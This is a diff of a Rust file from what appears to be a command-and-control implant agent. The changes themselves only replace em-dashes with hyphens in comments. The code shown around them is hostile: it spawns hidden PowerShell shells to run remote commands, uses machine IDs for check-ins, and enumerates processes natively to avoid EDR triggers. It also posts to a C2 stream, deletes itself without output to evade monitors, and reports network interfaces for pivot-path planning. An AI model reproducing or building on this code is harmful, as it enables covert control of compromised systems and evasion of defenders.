@@ -3,7 +3,7 @@ use uuid::Uuid;
 use sha2::{Sha256, Digest};
 use std::process::Command;
 
-// ── Shell spawn helper — keeps Windows-only API entirely off Linux/macOS ────
+// ── Shell spawn helper - keeps Windows-only API entirely off Linux/macOS ────
 
 /// Spawn a shell command as a child process.
 /// On Windows: PowerShell with CREATE_NO_WINDOW so no console flashes up.
@@ -12,7 +12,7 @@ use std::process::Command;
 fn spawn_shell(cmd: &str) -> std::io::Result<std::process::Child> {
     use std::os::windows::process::CommandExt;
     // CREATE_NO_WINDOW: tells Windows not to allocate a console window for this
-    // child process. This is the correct and sufficient flag — do NOT add
+    // child process. This is the correct and sufficient flag - do NOT add
     // DETACHED_PROCESS, which severs stdout/stderr pipe inheritance and causes
     // the child to produce no output even when Stdio::piped() is set.
     const CREATE_NO_WINDOW: u32 = 0x0800_0000;
@@ -85,7 +85,7 @@ pub fn generate_exe_id(salt: &str) -> String {
         let exe_path = match std::env::current_exe() {
             Ok(p) => p,
             Err(_) => {
-                // Can't even get our path — use a deterministic ID from machine UID
+                // Can't even get our path - use a deterministic ID from machine UID
                 // instead of a random UUID that would change every check-in.
                 return format!("fallback-{}", get_persistent_id());
             }
@@ -94,7 +94,7 @@ pub fn generate_exe_id(salt: &str) -> String {
         let file = match std::fs::File::open(&exe_path) {
             Ok(f) => f,
             Err(_) => {
-                // File locked (EDR) — hash the path + salt for a stable ID
+                // File locked (EDR) - hash the path + salt for a stable ID
                 let mut h = Sha256::new();
                 h.update(salt.as_bytes());
                 h.update(exe_path.to_string_lossy().as_bytes());
@@ -111,7 +111,7 @@ pub fn generate_exe_id(salt: &str) -> String {
                 Ok(0) => break,
                 Ok(n) => n,
                 Err(_) => {
-                    // Read error mid-stream — hash what we have so far
+                    // Read error mid-stream - hash what we have so far
                     break;
                 }
             };
@@ -133,7 +133,7 @@ pub fn execute_shell_command(cmd: &str) -> (String, String, i32) {
 /// Execute a shell command with a timeout. If the child process runs longer
 /// than the timeout, it's killed. This prevents GUI apps (notepad.exe) or
 /// long-running processes from permanently consuming a Tokio blocking thread
-/// — doing this 512 times exhausts the blocking pool and freezes the agent.
+/// - doing this 512 times exhausts the blocking pool and freezes the agent.
 pub fn execute_shell_command_timeout(cmd: &str, timeout: std::time::Duration) -> (String, String, i32) {
     let mut child = match spawn_shell(cmd) {
         Ok(c) => c,
@@ -142,7 +142,7 @@ pub fn execute_shell_command_timeout(cmd: &str, timeout: std::time::Duration) ->
 
     // Take ownership of pipes BEFORE the wait loop and drain them on
     // background threads via channels. Using channels instead of join()
-    // lets us apply a timeout — if a grandchild process inherited the pipe
+    // lets us apply a timeout - if a grandchild process inherited the pipe
     // and keeps it open after the direct child exits, join() would block
     // indefinitely, hanging the agent's command handler.
     let stdout_pipe = child.stdout.take();
@@ -167,7 +167,7 @@ pub fn execute_shell_command_timeout(cmd: &str, timeout: std::time::Duration) ->
     });
 
     // Grace period for reader threads after child exits. If a grandchild
-    // holds the pipe open, we don't wait forever — take what we have.
+    // holds the pipe open, we don't wait forever - take what we have.
     const READER_GRACE: std::time::Duration = std::time::Duration::from_secs(1);
 
     let start = std::time::Instant::now();
@@ -230,7 +230,7 @@ pub fn get_process_list() -> String {
     {
         // Native process enumeration via CreateToolhelp32Snapshot.
         // Spawning tasklist.exe from an unbacked process is a well-known
-        // EDR trigger — this avoids that entirely.
+        // EDR trigger - this avoids that entirely.
         use std::ffi::c_void;
         use std::mem;
 
@@ -469,7 +469,7 @@ pub async fn manual_http_post(stream: &mut C2Stream, host: &str, path: &str, dat
         body.truncate(len);
         Ok(body)
     } else {
-        // No Content-Length and not chunked — read until EOF with a size limit
+        // No Content-Length and not chunked - read until EOF with a size limit
         loop {
             let mut tmp2 = [0u8; 4096];
             match tokio::time::timeout(HTTP_READ_TIMEOUT, stream.read(&mut tmp2)).await {
@@ -493,7 +493,7 @@ pub async fn manual_http_post(stream: &mut C2Stream, host: &str, path: &str, dat
 pub fn self_destruct() -> ! {
     let current_exe = std::env::current_exe().unwrap_or_default();
     
-    // No output — avoid leaking intent to process monitors
+    // No output - avoid leaking intent to process monitors
     #[cfg(target_os = "windows")]
     {
         // Windows: Spawn a detached PowerShell cleanup job
@@ -528,7 +528,7 @@ pub fn strip_ansi(s: &str) -> String {
         if c == '\x1B' {
             // All branches below are guarded by `while let Some(&p) = chars.peek()`
             // or `if let Some(...)`, so incomplete escape sequences at the end of
-            // the string are handled safely — the iterator simply exhausts.
+            // the string are handled safely - the iterator simply exhausts.
             if let Some(&next) = chars.peek() {
                 if next == '[' {
                     chars.next(); // consume '['
@@ -552,7 +552,7 @@ pub fn strip_ansi(s: &str) -> String {
                     chars.next(); // single-char escape (e.g. ESC D, ESC M)
                 }
             }
-            // Lone ESC at end of string — consumed, nothing to do
+            // Lone ESC at end of string - consumed, nothing to do
         } else if c.is_control() && c != '\n' && c != '\r' && c != '\t' {
             continue;
         } else {
@@ -565,13 +565,13 @@ pub fn strip_ansi(s: &str) -> String {
 // ── Network interface enumeration ─────────────────────────────────────────────
 //
 // Used by the agent to report its local network topology to the server at
-// registration time.  The server scores these for pivot-path planning.
+// registration time. The server scores these for pivot-path planning.
 //
 // Implementation:
-//   Unix  — parses `ip -o addr show` (Linux) / `ifconfig -a` (macOS) output.
+//   Unix - parses `ip -o addr show` (Linux) / `ifconfig -a` (macOS) output.
 //            Both produce one address per line in a consistent format.
-//   Windows — PowerShell Get-NetIPAddress | ConvertTo-Json.
-//   Other   — returns empty list; topology simply won't rank that agent.
+//   Windows - PowerShell Get-NetIPAddress | ConvertTo-Json.
+//   Other - returns empty list; topology simply won't rank that agent.
 
 pub fn get_network_interfaces() -> Vec<crate::common::NetworkInterface> {
     #[cfg(target_os = "linux")]   { get_ifaces_linux() }
@@ -591,8 +591,8 @@ fn get_ifaces_linux() -> Vec<crate::common::NetworkInterface> {
     use std::collections::HashMap;
 
     // `ip -o addr show` prints one address per line:
-    //   2: eth0    inet 192.168.1.5/24 brd 192.168.1.255 scope global eth0
-    //   2: eth0    inet6 fe80::1/64 scope link
+    //   2: eth0 inet 192.168.1.5/24 brd 192.168.1.255 scope global eth0
+    //   2: eth0 inet6 fe80::1/64 scope link
     let (out, _, _) = execute_shell_command("ip -o addr show 2>/dev/null");
 
     // Collect addresses per interface name, then read flags from sysfs
@@ -671,7 +671,7 @@ fn get_ifaces_macos() -> Vec<crate::common::NetworkInterface> {
                 let parts: Vec<&str> = trimmed.split_whitespace().collect();
                 if parts.len() >= 4 {
                     let addr = parts[1];
-                    // netmask is hex: 0xffffff00 → 24 bits
+                    // netmask is hex: 0xffffff00 -> 24 bits
                     let hex  = parts[3].trim_start_matches("0x");
                     let mask = u32::from_str_radix(hex, 16).unwrap_or(0);
                     let pfx  = mask.count_ones();
@@ -689,7 +689,7 @@ fn get_ifaces_macos() -> Vec<crate::common::NetworkInterface> {
 
 #[cfg(target_os = "macos")]
 fn parse_macos_flags(header: &str) -> Vec<String> {
-    // Extract the angle-bracketed list:  flags=8863<UP,BROADCAST,RUNNING,…>
+    // Extract the angle-bracketed list: flags=8863<UP,BROADCAST,RUNNING,…>
     if let (Some(a), Some(b)) = (header.find('<'), header.find('>')) {
         return header[a+1..b].split(',').map(|s| s.to_string()).collect();
     }
